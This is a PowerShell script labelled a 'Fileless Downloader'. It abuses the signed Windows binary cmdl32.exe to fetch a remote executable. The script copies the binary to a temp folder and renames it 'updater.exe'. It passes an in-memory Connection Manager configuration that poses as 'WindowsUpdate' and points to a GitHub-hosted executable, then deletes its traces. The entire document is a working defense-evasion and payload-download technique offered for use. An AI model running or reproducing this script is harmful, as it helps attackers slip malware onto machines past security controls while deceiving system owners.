Write-Host "[-] Fileless Downloader - liquidsky ^_~"
# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
# Create a temp directory to copy and rename cmdl32.exe
$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
New-Item -Path $tempDir -ItemType Directory -Force

# Copy cmdl32.exe to temp and rename
$sourceCmdl32 = "C:\Windows\System32\cmdl32.exe"
$renamedCmdl32 = Join-Path -Path $tempDir -ChildPath "updater.exe"
Copy-Item -Path $sourceCmdl32 -Destination $renamedCmdl32 -Force
Write-Host "[*] Copied cmdl32.exe to $renamedCmdl32"

# Embed settings file content directly in memory
$settingsContent = @"
[Connection Manager]
CMSFile=settings.txt
ServiceName=WindowsUpdate
TunnelFile=settings.txt
[Settings]
UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
"@

# Execute renamed cmdl32.exe with arguments, feeding settings from memory
Write-Host "[*] Executing renamed cmdl32.exe with memory-based configuration"
$cmdArguments = "/vpn /lan `"$settingsContent`""
try {
    Start-Process -FilePath $renamedCmdl32 -ArgumentList $cmdArguments -NoNewWindow -Wait
    Write-Host "[*] Execution completed."
} catch {
    Write-Host "[!] Execution failed: $($_.Exception.Message)"
    Exit
}

# Clean up: Remove the copied and renamed cmdl32
Write-Host "[*] Cleaning up temporary files"
Remove-Item -Path $renamedCmdl32 -Force
Remove-Item -Path $tempDir -Recurse -Force
Write-Host "[*] Script complete."
